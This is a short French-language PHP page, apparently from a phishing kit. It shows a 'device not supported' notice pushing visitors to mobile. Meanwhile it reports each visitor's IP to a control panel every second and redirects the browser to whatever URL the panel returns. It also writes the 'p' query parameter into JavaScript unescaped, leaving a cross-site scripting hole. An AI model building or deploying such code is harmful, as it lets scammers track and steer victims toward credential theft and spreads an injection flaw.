<?php 
require (__DIR__).'/../panel/panel.class.php';
$pnl = new Panel();
$current_data = $pnl->getData();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Appareil non pris en charge.</title>
    <link rel="stylesheet" href="res/main.css">
</head>
<body style="text-align:center; width:100%; background:white;">
<div style="background:white; padding:10px;">
<img src="res/logo.png" style="width:120px;">
</div>
<div style="position:fixed; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100%; width:100%; top:0; left:0;">
<div style="width:400px; text-align:right; margin:0; padding:0; margin-bottom:-5px;">
<img src="res/phone.png" style="width:100px;" >
</div>
<div style="background:#f9f9f9; padding:30px; width:400px;">
Nous vous informons que l'accès à cette page nécessite l'utilisation d'un appareil mobile. Actuellement, la version pour ordinateur n'est pas prise en charge. Veuillez vous connecter à partir d'un appareil mobile pour profiter pleinement de toutes les fonctionnalités de notre site.
</div>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d){
            window.location=d;
        }
    })

}, 2000);
</script>
</body>
</html>